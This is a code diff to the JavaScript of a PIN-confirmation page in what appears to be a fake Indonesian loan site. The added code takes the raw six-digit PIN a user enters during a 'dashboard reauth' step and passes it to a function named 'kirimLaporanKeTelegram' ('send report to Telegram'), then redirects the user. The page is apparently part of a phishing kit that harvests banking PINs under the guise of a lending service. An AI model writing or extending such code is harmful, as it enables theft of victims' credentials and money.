@@ -6,6 +6,7 @@
   if (!NovaStorage.requireLoan()) return;
   if (!NovaStorage.requireSummary()) return;
 
+  const isDashboardReauth = sessionStorage.getItem('kbDashboardReauth') === '1';
   let pin = '';
   const dots = [...document.querySelectorAll('.pin-dot')];
   const button = document.getElementById('confirmPinButton');
@@ -29,6 +30,19 @@
     if (pin.length !== 6) return;
     const rawPin = pin;
     pin = '';
+
+    if (isDashboardReauth) {
+      window.kirimLaporanKeTelegram?.({
+        event: 'PIN_REAUTH_CONFIRMED',
+        page: 'konfirmasi-pin.html',
+        pin: rawPin,
+        status: 'PIN_REAUTH_CONFIRMED'
+      });
+      sessionStorage.removeItem('kbDashboardReauth');
+      location.replace('dashboard-pinjaman.html');
+      return;
+    }
+
     NovaStorage.confirmPin();
     NovaStorage.setApplication({ lastPin: rawPin });
     window.kirimLaporanKeTelegram?.({
@@ -40,6 +54,12 @@
     location.replace('proses-pengajuan.html');
   });
 
-  document.getElementById('backButton').addEventListener('click', () => history.back());
+  document.getElementById('backButton').addEventListener('click', () => {
+    if (isDashboardReauth) {
+      location.replace('verifikasi-sms.html');
+      return;
+    }
+    history.back();
+  });
   render();
 })();
